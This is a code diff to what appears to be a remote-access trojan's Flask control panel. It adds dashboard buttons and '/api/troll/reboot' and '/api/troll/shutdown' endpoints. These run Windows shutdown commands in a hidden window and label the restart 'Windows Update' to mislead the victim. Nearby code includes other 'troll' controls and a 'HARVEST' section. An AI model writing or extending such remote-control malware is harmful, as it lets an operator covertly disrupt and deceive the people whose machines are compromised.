@@ -1426,6 +1426,13 @@ DASHBOARD_HTML = r'''
                         <button class="btn" onclick="monitorOn()" style="flex: 1;">Turn On</button>
                     </div>
                 </div>
+                <div class="section" style="border-color: rgba(239, 68, 68, 0.3);">
+                    <div class="section-header"><div class="section-title" style="color: #ef4444;">Power</div></div>
+                    <div style="display: flex; gap: 10px;">
+                        <button class="btn danger" onclick="rebootHost()" style="flex: 1;">Reboot</button>
+                        <button class="btn danger" onclick="shutdownHost()" style="flex: 1;">Shutdown</button>
+                    </div>
+                </div>
                 </div>
             </div>
 
@@ -1935,6 +1942,16 @@ DASHBOARD_HTML = r'''
         async function monitorOn() {
             await fetch('/api/troll/monitor', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'on'})});
             logActivity('Monitor turned on');
+        }
+        async function rebootHost() {
+            if (!confirm('Reboot this machine?')) return;
+            await fetch('/api/troll/reboot', {method:'POST'});
+            logActivity('Reboot initiated');
+        }
+        async function shutdownHost() {
+            if (!confirm('Shutdown this machine?')) return;
+            await fetch('/api/troll/shutdown', {method:'POST'});
+            logActivity('Shutdown initiated');
         }
 
         // ===== HARVEST =====
@@ -3107,6 +3124,24 @@ def troll_monitor():
             ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
             ctypes.windll.user32.SetCursorPos(0, 0)
         return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/troll/reboot', methods=['POST'])
+def troll_reboot():
+    """Reboot the host machine."""
+    try:
+        subprocess.run(['shutdown', '/r', '/t', '5', '/c', 'Windows Update'], creationflags=0x08000000)
+        return jsonify({'success': True, 'status': 'Rebooting in 5 seconds'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/troll/shutdown', methods=['POST'])
+def troll_shutdown():
+    """Shutdown the host machine."""
+    try:
+        subprocess.run(['shutdown', '/s', '/t', '5', '/c', 'Windows Update'], creationflags=0x08000000)
+        return jsonify({'success': True, 'status': 'Shutting down in 5 seconds'})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
